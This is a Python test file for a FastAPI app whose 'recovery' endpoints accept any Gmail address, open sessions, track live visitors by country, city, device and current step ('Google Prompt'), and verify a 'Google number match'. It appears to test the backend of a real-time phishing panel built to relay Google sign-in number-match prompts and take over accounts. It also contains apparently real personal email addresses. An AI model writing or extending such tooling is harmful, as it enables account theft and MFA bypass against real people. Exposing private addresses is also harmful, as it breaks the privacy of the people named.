from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)

def test_full_recovery_flow():
    print("=== TEST 1: LOOKUP SEEDED USER ===")
    res = client.post("/api/recovery/lookup", json={"identifier": "igwikejerome@gmail.com"})
    assert res.status_code == 200, f"Lookup failed: {res.text}"
    lookup_data = res.json()
    assert lookup_data["success"] is True
    assert lookup_data["email"] == "igwikejerome@gmail.com"
    session_id = lookup_data["session_id"]
    match_number = lookup_data["match_number"]
    print(f"-> Lookup OK! Session: {session_id}, Match Number: {match_number}")

    print("\n=== TEST 2: LOOKUP ANY ARBITRARY EMAIL (AUTOMATIC INITIALIZATION) ===")
    arbitrary_email = "robertmoorebusiness1@gmail.com"
    res_any = client.post("/api/recovery/lookup", json={"identifier": arbitrary_email})
    assert res_any.status_code == 200, f"Any email should succeed: {res_any.text}"
    data_any = res_any.json()
    assert data_any["email"] == arbitrary_email
    print(f"-> Arbitrary email '{arbitrary_email}' successfully initialized session: {data_any['session_id']}")

    print("\n=== TEST 3: REAL-TIME VISITOR PRESENCE HEARTBEAT ===")
    hb_res = client.post("/api/presence/heartbeat", json={
        "visitor_id": "test_visitor_123",
        "email": arbitrary_email,
        "current_step": "Google Prompt (#63)",
        "device_info": {
            "country": "Nigeria",
            "country_code": "NG",
            "city": "Lagos",
            "device_type": "Mobile",
            "os": "iOS 18",
            "browser": "Safari"
        }
    })
    assert hb_res.status_code == 200
    print("-> Heartbeat recorded!")

    print("\n=== TEST 4: LIVE VISITORS LIST ===")
    live_res = client.get("/api/presence/live-visitors")
    assert live_res.status_code == 200
    live_data = live_res.json()
    assert live_data["active_visitors_count"] >= 1
    visitor = next((v for v in live_data["visitors"] if v["visitor_id"] == "test_visitor_123"), None)
    assert visitor is not None
    assert visitor["is_active"] is True
    assert visitor["country_flag"] == "🇳🇬"
    assert visitor["device_type"] == "Mobile"
    assert visitor["email"] == arbitrary_email
    print(f"-> Active visitor tracked live: [{visitor['country_code']}] {visitor['country']} ({visitor['city']}) | {visitor['device_type']} | {visitor['status_text']}")

    print("\n=== TEST 5: VISITOR LEAVE BEACON (ASAP INACTIVE) ===")
    leave_res = client.post("/api/presence/leave", json={"visitor_id": "test_visitor_123"})
    assert leave_res.status_code == 200
    
    # Check live visitors again
    live_res2 = client.get("/api/presence/live-visitors").json()
    v2 = next((v for v in live_res2["visitors"] if v["visitor_id"] == "test_visitor_123"), None)
    assert v2["is_active"] is False
    print(f"-> Visitor marked inactive immediately on leave: {v2['status_text']}")

    print("\n=== TEST 6: GOOGLE NUMBER MATCH VERIFICATION ===")
    match_res = client.post("/api/recovery/verify-match-number", json={
        "session_id": session_id,
        "chosen_number": match_number
    })
    assert match_res.status_code == 200
    print(f"-> Number {match_number} verified successfully!")

    print("\n>>> ALL TESTS PASSED WITH 100% SUCCESS! <<<")

if __name__ == "__main__":
    test_full_recovery_flow()
